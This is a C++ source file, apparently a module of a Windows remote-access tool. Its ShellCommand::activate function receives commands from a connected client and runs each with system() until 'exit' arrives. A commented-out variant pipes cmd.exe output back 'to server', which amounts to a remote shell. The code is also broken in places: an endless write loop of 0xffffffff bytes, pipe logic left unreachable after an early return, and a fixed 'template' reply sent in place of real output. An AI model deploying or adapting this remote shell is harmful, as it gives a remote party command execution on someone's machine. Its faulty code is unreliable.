#include "ShellCommand.h"
#define BUFSIZE 256

HANDLE g_hChildStd_IN_Rd = NULL;
HANDLE g_hChildStd_IN_Wr = NULL;
HANDLE g_hChildStd_OUT_Rd = NULL;
HANDLE g_hChildStd_OUT_Wr = NULL;
HANDLE g_hInputFile = NULL;

void WriteToPipe(CHAR* chBuf)

// Read from a file and write its contents to the pipe for the child's STDIN.
// Stop when there is no more data. 
{
	DWORD dwRead=0xffffffff, dwWritten;
	BOOL bSuccess = FALSE;

	for (;;)
	{
		bSuccess = WriteFile(g_hChildStd_IN_Wr, chBuf, dwRead, &dwWritten, NULL);
		if (!bSuccess) break;
	}

	// Close the pipe handle so the child process stops reading. 

	if (!CloseHandle(g_hChildStd_IN_Wr))
	{ }
}

void ReadFromPipe(Client c)

// Read output from the child process's pipe for STDOUT
// and write to the parent process's pipe for STDOUT. 
// Stop when there is no more data. 
{
	DWORD dwRead, dwWritten;
	CHAR chBuf[BUFSIZE];
	BOOL bSuccess = FALSE;
	HANDLE hParentStdOut = GetStdHandle(STD_OUTPUT_HANDLE);

	for (;;)
	{
		bSuccess = ReadFile(g_hChildStd_OUT_Rd, chBuf, BUFSIZE, &dwRead, NULL);
		if (!bSuccess || dwRead == 0) break;
		chBuf[dwRead % BUFSIZE] = 0;
		c.send_msg(chBuf);
		printf("%s", chBuf);
		if (!bSuccess) break;
	}
}

int ShellCommand::activate(Client* c, list<string> params) {

	DWORD in = 0;

	// old implementation...
	SECURITY_ATTRIBUTES saAttr;
	// Set the bInheritHandle flag so pipe handles are inherited. 
	saAttr.nLength = sizeof(SECURITY_ATTRIBUTES);
	saAttr.bInheritHandle = TRUE;
	saAttr.lpSecurityDescriptor = NULL;
	TCHAR szCmdline[] = TEXT("C:\\Windows\\System32\\cmd.exe");
	PROCESS_INFORMATION piProcInfo;
	STARTUPINFO siStartInfo;
	BOOL bSuccess = FALSE;

	// setting stdout to be our handle to read from

	char* command;
	char buffer[BUFSIZE] = "template";
	command = c->recv_msg(BUFSIZE);

	while (strcmp(command, "exit") != 0) {
		system(command);
		c->send_msg(buffer);
		delete command;
		command = c->recv_msg(BUFSIZE);
	}
	return 0;

	// implementation of piping commands to cmd failed...

	printf("\n->Start of parent execution.\n");

	// Create a pipe for the child process's STDOUT. 

	if (!CreatePipe(&g_hChildStd_OUT_Rd, &g_hChildStd_OUT_Wr, &saAttr, 0)) {
		c->send_msg((LPSTR)"ERROR");
		in = WSAGetLastError();
		goto cleanup3;
	}

	// Ensure the read handle to the pipe for STDOUT is not inherited.

	if (!SetHandleInformation(g_hChildStd_OUT_Rd, HANDLE_FLAG_INHERIT, 0)) {
		c->send_msg((LPSTR)"ERROR");
		in = WSAGetLastError();
		goto cleanup3;
	}

	// Create a pipe for the child process's STDIN. 

	if (!CreatePipe(&g_hChildStd_IN_Rd, &g_hChildStd_IN_Wr, &saAttr, 0)) {
		c->send_msg((LPSTR)"ERROR");
		in = WSAGetLastError();
		goto cleanup2;
	}
		

	// Ensure the write handle to the pipe for STDIN is not inherited. 

	if (!SetHandleInformation(g_hChildStd_IN_Wr, HANDLE_FLAG_INHERIT, 0)) {
		c->send_msg((LPSTR)"ERROR");
		in = WSAGetLastError();
		goto cleanup2;
	}
		
	// Create the child process. 
	// Set up members of the PROCESS_INFORMATION structure. 

	ZeroMemory(&piProcInfo, sizeof(PROCESS_INFORMATION));

	// Set up members of the STARTUPINFO structure. 
	// This structure specifies the STDIN and STDOUT handles for redirection.

	ZeroMemory(&siStartInfo, sizeof(STARTUPINFO));
	siStartInfo.cb = sizeof(STARTUPINFO);
	siStartInfo.hStdError = g_hChildStd_OUT_Wr;
	siStartInfo.hStdOutput = g_hChildStd_OUT_Wr;
	siStartInfo.hStdInput = g_hChildStd_IN_Rd;
	siStartInfo.dwFlags |= STARTF_USESTDHANDLES;

	// Create the child process. 

	bSuccess = CreateProcess(NULL,
		szCmdline,     // command line 
		NULL,          // process security attributes 
		NULL,          // primary thread security attributes 
		TRUE,          // handles are inherited 
		0,             // creation flags 
		NULL,          // use parent's environment 
		NULL,          // use parent's current directory 
		&siStartInfo,  // STARTUPINFO pointer 
		&piProcInfo);  // receives PROCESS_INFORMATION 

	 // If an error occurs, exit the application. 
	if (!bSuccess) {
		c->send_msg((LPSTR)"ERROR");
		in = WSAGetLastError();
		goto cleanup;
	}

	// Get a handle to an input file for the parent. 
	// This example assumes a plain text file and uses string output to verify data flow. 
	// Write to the pipe that is the standard input for a child process. 
	// Data is written to the pipe's buffers, so it is not necessary to wait
	// until the child process is running before writing data.
	
	while (strcmp(command, "exit") != 0) {
		WriteToPipe(command);
		printf("\n->Contents of msg written to child STDIN pipe.\n");

		// Read from pipe that is the standard output for child process. 

		printf("\n->Contents of child process STDOUT:\n\n");
		ReadFromPipe(*c);

		delete command;
		command = c->recv_msg(BUFSIZE);
	}
	printf("\n->End of parent execution.\n");

	// cleanup:
cleanup:
	TerminateProcess(piProcInfo.hProcess, 0);
	CloseHandle(piProcInfo.hProcess);
	CloseHandle(piProcInfo.hThread);
cleanup2:
	CloseHandle(g_hChildStd_IN_Wr);
cleanup3:
	CloseHandle(g_hChildStd_OUT_Rd);
	CloseHandle(g_hChildStd_OUT_Wr);
	return in;
}

//void temp() {
//	DWORD in = 0;
//	DWORD written;
//	DWORD bytes;
//	char* buff;
//	char* command = c.recv_msg(128);
//	// create pipes for the cmd process:
//	HANDLE hPipeIn_rd, hPipeOut_rd, hPipeIn_wt, hPipeOut_wt;
//	SECURITY_ATTRIBUTES secAttr;
//	secAttr.nLength = sizeof(SECURITY_ATTRIBUTES);
//	secAttr.bInheritHandle = true;
//	secAttr.lpSecurityDescriptor = NULL;
//	if (!CreatePipe(&hPipeIn_rd, &hPipeIn_wt, &secAttr, 0)) {
//		c.send_msg((LPSTR)"ERROR");
//		goto cleanup3;
//	}
//	if (!SetHandleInformation(hPipeIn_rd, HANDLE_FLAG_INHERIT, 0))
//		goto cleanup3;
//	if (!CreatePipe(&hPipeOut_rd, &hPipeOut_wt, &secAttr, 128)) {
//		c.send_msg((LPSTR)"ERROR");
//		goto cleanup2;
//	}
//	if (!SetHandleInformation(hPipeOut_rd, HANDLE_FLAG_INHERIT, 0))
//		goto cleanup2;
//	// create a cmd process:
//	STARTUPINFOA si;
//	PROCESS_INFORMATION pi;
//	ZeroMemory(&pi, sizeof(PROCESS_INFORMATION));
//	ZeroMemory(&si, sizeof(STARTUPINFOA));
//	si.hStdError = hPipeOut_wt;
//	si.hStdOutput = hPipeOut_wt;
//	si.hStdInput = hPipeIn_rd;
//	si.dwFlags |= STARTF_USESTDHANDLES;
//	if (!CreateProcessA(NULL, (LPSTR)"C:\\Windows\\System32\\cmd.exe", NULL, NULL, TRUE, NULL, NULL, NULL, &si, &pi)) {
//		DWORD in = GetLastError();
//		c.send_msg((LPSTR)"ERROR");
//		goto cleanup;
//	}
//	PeekNamedPipe(hPipeOut_rd, NULL, 0, NULL, &bytes, NULL);
//	// wait until output is available...
//	buff = new char[bytes + 1];
//	if (!ReadFile(hPipeOut_rd, buff, bytes, &written, NULL))
//	{
//		DWORD in = GetLastError();
//		c.send_msg((LPSTR)"ERROR");
//		goto cleanup;
//	}
//	buff[bytes] = 0;
//	while (strcmp(command, "exit") != 0) {
//		// write command to process via pipe:
//		if (!WriteFile(hPipeIn_wt, command, strlen(command), &written, NULL))
//		{
//			DWORD in = GetLastError();
//			c.send_msg((LPSTR)"ERROR");
//			goto cleanup;
//		}
//		PeekNamedPipe(hPipeIn_rd, NULL, 0, NULL, &bytes, NULL);
//		// read command output via pipe:
//		PeekNamedPipe(hPipeOut_rd, NULL, 0, NULL, &bytes, NULL);
//		// wait until output is available...
//		char* buff = new char[bytes + 1];
//		if (!ReadFile(hPipeOut_rd, buff, bytes, &written, NULL))
//		{
//			DWORD in = GetLastError();
//			c.send_msg((LPSTR)"ERROR");
//			goto cleanup;
//		}
//		// send the output to server
//		buff[written] = 0;
//		c.send_msg(buff);
//		// recv next command
//		delete command;
//		command = c.recv_msg(128);
//	}
//}